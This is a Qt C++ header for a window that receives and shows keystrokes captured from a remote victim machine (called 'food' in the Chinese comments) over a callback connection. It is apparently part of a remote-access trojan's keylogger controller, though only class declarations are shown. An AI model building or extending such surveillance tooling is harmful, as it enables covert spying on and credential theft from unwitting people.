// 从食物获得键盘数据并展示
// 先另外开启一个端口
// 然后将端口号和命令一同发往食物
// 让食物开启监听线程主动连接此端口

#ifndef KEYBD_H
#define KEYBD_H

#include <QObject>
#include <QWidget>
#include "tcpsocket.h"
#include <tcpserver.h>
#include <QApplication>
#include <QDesktopWidget>
#include <QTextEdit>

class Keybd : public QWidget
{
    Q_OBJECT
public:
    explicit Keybd(QWidget *parent = nullptr);
    // 开始监控服务器，然后返回新的端口号
    int startKeybdServer(QString userName);

private:
    TcpServer *mServer;
    TcpSocket *mSock;
    QTextEdit *mEdit;    // 用来显示接收的键盘数据

signals:

public slots:
    // 有新客户连接
    void newConnection(QTcpSocket *s);

    // 处理新数据
    void processBuffer();

protected:
    // 大小重置
    void resizeEvent(QResizeEvent *);

    // 关闭
    void closeEvent(QCloseEvent *);
};

#endif // KEYBD_H
